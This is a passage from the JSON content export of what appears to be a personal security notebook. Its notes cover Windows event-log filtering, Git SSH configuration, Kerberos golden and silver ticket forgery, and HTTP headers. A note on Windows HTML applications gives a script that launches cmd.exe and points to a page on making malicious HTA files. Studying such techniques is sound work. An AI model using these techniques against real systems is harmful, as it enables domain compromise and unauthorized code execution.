-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;LogName Application &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; Where-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;.ProviderName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -Match&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;WLMS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# To match event IDs with Where-Object, use the slightly&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# different form `Where-Object Id -eq 100`, etc.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Use the -FilterHashtable flag. This causes the filtering to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# be done during the call made by Get-WinEvent, and has a more&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# straight-forward syntax too. However, it only works when&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# called against the system event log; Where-Object needs to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# be used when specifying an archived log via -Path.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Note that hashes can be specified with newlines instead of&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# semicolons as well, which can make scripts A LOT more&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# readable!&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-WinEvent&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;FilterHashtable &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\tLogName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Application&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\tProviderName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;WLMS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# To display all information about an event, pipe the output&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# of Get-WinEvent to `Format-List -Property *`&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;filterhashtable&quot;&gt;FilterHashtable&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#filterhashtable&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;There’s lots of good information about the various FilterHashtable keys in &lt;a href=&quot;https://docs.microsoft.com/powershell/scripting/samples/Creating-Get-WinEvent-queries-with-FilterHashtable&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Microsoft’s documentation&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. Some important ones:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;LogName (String)&lt;/li&gt;\n&lt;li&gt;ProviderName (String)&lt;/li&gt;\n&lt;li&gt;Path (String)&lt;/li&gt;\n&lt;li&gt;Keywords (Long)&lt;/li&gt;\n&lt;li&gt;ID (Int32)&lt;/li&gt;\n&lt;li&gt;Level (Int32)&lt;/li&gt;\n&lt;li&gt;StartTime (DateTime)&lt;/li&gt;\n&lt;li&gt;EndTime (DateTime)&lt;/li&gt;\n&lt;li&gt;UserID (SID)&lt;/li&gt;\n&lt;li&gt;Data (String)&lt;/li&gt;\n&lt;li&gt;[NamedData] (String)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Wildcards can be used with LogName and ProviderName, but not with other keys.&lt;/p&gt;\n&lt;p&gt;Event Viewer displays &lt;em&gt;most&lt;/em&gt; of these values in the “General” when viewing an individual log entry, though note that Keywords is translated to a string.&lt;/p&gt;\n&lt;h3 id=&quot;keywords&quot;&gt;Keywords&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#keywords&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;AuditFailure (4503599627370496)&lt;/li&gt;\n&lt;li&gt;AuditSuccess (9007199254740992)&lt;/li&gt;\n&lt;li&gt;CorrelationHint2 (18014398509481984)&lt;/li&gt;\n&lt;li&gt;EventLogClassic (36028797018963968)&lt;/li&gt;\n&lt;li&gt;Sqm (2251799813685248)&lt;/li&gt;\n&lt;li&gt;WdiDiagnostic (1125899906842624)&lt;/li&gt;\n&lt;li&gt;WdiContext (562949953421312)&lt;/li&gt;\n&lt;li&gt;ResponseTime (281474976710656)&lt;/li&gt;\n&lt;li&gt;None (0)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;levels&quot;&gt;Levels&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#levels&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;Verbose (5)&lt;/li&gt;\n&lt;li&gt;Informational (4)&lt;/li&gt;\n&lt;li&gt;Warning (3)&lt;/li&gt;\n&lt;li&gt;Error (2)&lt;/li&gt;\n&lt;li&gt;Critical (1)&lt;/li&gt;\n&lt;li&gt;LogAlways (0)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;event-ids&quot;&gt;Event IDs&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#event-ids&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Windows-event-IDs&quot; data-block=&quot;&quot; data-embed-alias=&quot;Windows event IDs&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-event-IDs&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Windows-event-IDs&quot;&gt;Transclude of Windows-event-IDs&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Git-on-Windows":{"slug":"spells/Git-on-Windows","filePath":"spells/Git on Windows.md","title":"Git on Windows","links":["spells/SSH"],"tags":["OS/Windows","Application/Git","Application/SSH","Application/PowerShell"],"content":"Windows binaries specified as Git configuration options should be quoted, as otherwise they will often exhibit strange behaviors (for example, SSH may not see all of its command line arguments). It’s easiest to do this using single quotes, as PowerShell can be particular about how double quotes are interpreted… But to do so still requires that the entire string be surrounded by double quotes!\nFor example, the following command will configure Git to use Window’s built-in SSH executable:\ngit config --global core.sshCommand &quot;&#039;C:\\Windows\\system32\\OpenSSH\\ssh.exe&#039;&quot;","richContent":"&lt;p&gt;Windows binaries specified as Git configuration options should be quoted, as otherwise they will often exhibit strange behaviors (for example, &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; may not see all of its command line arguments). It’s easiest to do this using single quotes, as PowerShell can be particular about how double quotes are interpreted… But to do so still requires that the entire string be surrounded by double quotes!&lt;/p&gt;\n&lt;p&gt;For example, the following command will configure Git to use Window’s built-in SSH executable:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;git config &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;--&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;global core.sshCommand &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&#039;C:\\Windows\\system32\\OpenSSH\\ssh.exe&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Golden-and-silver-ticket-attacks":{"slug":"spells/Golden-and-silver-ticket-attacks","filePath":"spells/Golden and silver ticket attacks.md","title":"Golden and silver ticket attacks","links":["spells/Kerberos"],"tags":["Protocol/Kerberos","OS/Windows/ActiveDirectory","Cryptography/Hashes/NT","AttackCycle/PrivEsc/GoldenTickets","AttackCycle/LateralMovement/SilverTickets"],"content":"The idea with Kerberos gold and silver tickets is that, since the KDC and service long term secret keys are just the NT hashes of the corresponding service account’s passwords, then if you can dump the password (or even its hash), you can forge a Kerberos ticket without ever needing to contact the KDC.\nSilver tickets are forged using a service account’s NT hash, and can be used to grant any user access to that service. This works because Kerberos implicitly assumes that only the KDC and the service account know the service account’s long term secret key.\nGolden tickets take things a step further — if you can get the krbtgt user’s NT hash, then you can forge a ticket granting ticket for any user, and then use that to get the KDC to provide a valid service ticket for any service that user has access to. This works because Kerberos trusts the encrypted ticket granting ticket blob and doesn’t reauthenticate the user before granting further access.\nGolden tickets are powerful (since you can be anyone, it’s trivial to gain control of the domain), but also noisier — because you’re running through the KDC infrastructure, golden ticket still generate (almost) all of the normal logging, while silver tickets allow you to bypass the KDC completely and only generate logs on the service server (if that).","richContent":"&lt;p&gt;The idea with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; &lt;a href=&quot;https://en.hackndo.com/kerberos-silver-golden-tickets/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;gold and silver tickets&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is that, since the KDC and service long term secret keys are just the NT hashes of the corresponding service account’s passwords, then if you can dump the password (or even its hash), you can &lt;em&gt;forge&lt;/em&gt; a Kerberos ticket without ever needing to contact the KDC.&lt;/p&gt;\n&lt;p&gt;Silver tickets are forged using a service account’s NT hash, and can be used to grant any user access to that service. This works because Kerberos implicitly assumes that &lt;em&gt;only&lt;/em&gt; the KDC and the service account know the service account’s long term secret key.&lt;/p&gt;\n&lt;p&gt;Golden tickets take things a step further — if you can get the krbtgt &lt;em&gt;user&lt;/em&gt;’s NT hash, then you can forge a ticket granting ticket for any user, and then use that to get the KDC to provide a valid service ticket for any service that user has access to. This works because Kerberos trusts the encrypted ticket granting ticket blob and &lt;em&gt;doesn’t reauthenticate the user before granting further access&lt;/em&gt;.&lt;/p&gt;\n&lt;p&gt;Golden tickets are powerful (since you can be anyone, it’s trivial to gain control of the domain), but also noisier — because you’re running through the KDC infrastructure, &lt;a href=&quot;https://blog.quest.com/golden-ticket-attacks-how-they-work-and-how-to-defend-against-them/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;golden ticket still generate (almost) all of the normal logging, while silver tickets allow you to bypass the KDC completely and only generate logs on the service server (if that)&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;"},"spells/HTML-applications":{"slug":"spells/HTML-applications","filePath":"spells/HTML applications.md","title":"HTML applications","links":["spells/Exploit-Windows-HTML-applications-with-msfvenom"],"tags":["FileFormat/HTML","FileFormat/HTA","OS/Windows"],"content":"Windows “HTML Applications” are just HTML files (with the .hta extension) containing JavaScript of VBScript. These are interpreted using the mshta.exe binary; IE and Edge will both helpfully offer to run these files after they’re downloaded.\nA simple example that pops a command prompt:\n&lt;html&gt;\n\t&lt;body&gt;\n\t\t&lt;script&gt;\n\t\t\tvar command = ‘cmd.exe’\n\t\t\tnew ActiveXObject(‘WScript.Shell’).Run(command);\n\t\t&lt;/script&gt;\n\t&lt;/body&gt;\n&lt;/html&gt;\nCreate malicious HTA files using Metasploit\nTransclude of Exploit-Windows-HTML-applications-with-msfvenom","richContent":"&lt;p&gt;Windows “HTML Applications” are just HTML files (with the .hta extension) containing JavaScript of VBScript. These are interpreted using the mshta.exe binary; IE and Edge will both helpfully offer to run these files after they’re downloaded.&lt;/p&gt;\n&lt;p&gt;A simple example that pops a command prompt:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;html&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;body&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t\t&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\t\t\tvar&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; command&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; ‘&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;cmd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;’&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\t\t\tnew&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; ActiveXObject&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;‘&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;WScript&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;Shell&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;’&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;).&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Run&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;command&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t\t&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;body&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;html&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;create-malicious-hta-files-using-metasploit&quot;&gt;Create malicious HTA files using Metasploit&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#create-malicious-hta-files-using-metasploit&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Exploit-Windows-HTML-applications-with-msfvenom&quot; data-block=&quot;&quot; data-embed-alias=&quot;Exploit Windows HTML applications with msfvenom&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-HTML-applications-with-msfvenom&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Exploit-Windows-HTML-applications-with-msfvenom&quot;&gt;Transclude of Exploit-Windows-HTML-applications-with-msfvenom&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/HTTP":{"slug":"spells/HTTP","filePath":"spells/HTTP.md","title":"HTTP","links":["spells/HTTP"],"tags":["Protocol/HTTP"],"content":"The Hypertext Transfer Protocol (HTTP) might just be the most common application-level protocol out there these days.\nA minimal HTTP request\nGET / HTTP/1.1\nhost: something\n \n(Note the blank line at the end.)\nHTTP headers\nHTTP headers are (relatively) arbitrary. Common/Important ones to watch out for:\n\nServer — Web server information (Apache, NGINX, etc.); useful for recon.\nTrue-Client-IP — Override the client IP address (direct connections to servers).\nX-Forwarded-For — Override the client IP address (connections forwarded through proxies).\nX-Powered-By — Added by some application engines to advertise themselves; useful for recon.\nContent-Type — Specifies the body content; normally only set by the client for POST/PATCH requests (for example, form data uses application/x-www-form-urlencoded.\nContent-Length — The length of the body in bytes (which is just characters for ASCII) for POST requests.\n\nThere are other headers (for example, Cookie), obviously. Arbitrary additional (non-standard) headers should be X-prefixed, though there’s technically nothing stopping anyone from ignoring this convention/standard.","richContent":"&lt;p&gt;The Hypertext Transfer Protocol (HTTP) might just be the most common application-level protocol out there these days.&lt;/p&gt;\n&lt;h2 id=&quot;a-minimal-http-request&quot;&gt;A minimal HTTP request&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#a-minimal-http-request&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure 